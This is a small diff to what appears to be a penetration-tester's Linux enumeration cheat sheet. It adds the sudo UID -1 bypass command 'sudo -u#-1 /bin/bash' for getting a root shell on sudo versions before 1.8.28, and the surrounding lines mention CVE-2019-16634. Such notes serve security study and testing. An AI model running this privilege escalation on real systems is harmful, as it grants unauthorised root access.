@@ -1,4 +1,3 @@
-  
 # Linux Host Enumeration   
 ## Contents 
 - [Linux Host Enumeration](#linux-host-enumeration)
@@ -160,6 +159,8 @@ Sudo versions < 1.8.28. Sees -1 and reads as 0 (UID of root)
 sudo -l, see (ALL,!root)  
 
     sudo -u#-1 [binary escape]  
+    sudo -u#-1 /bin/bash      #get a bash root shell    
+
     
 ### CVE-2019-16634 Buffer Overflow 
 versions of sudo earlier than 1.8.26  
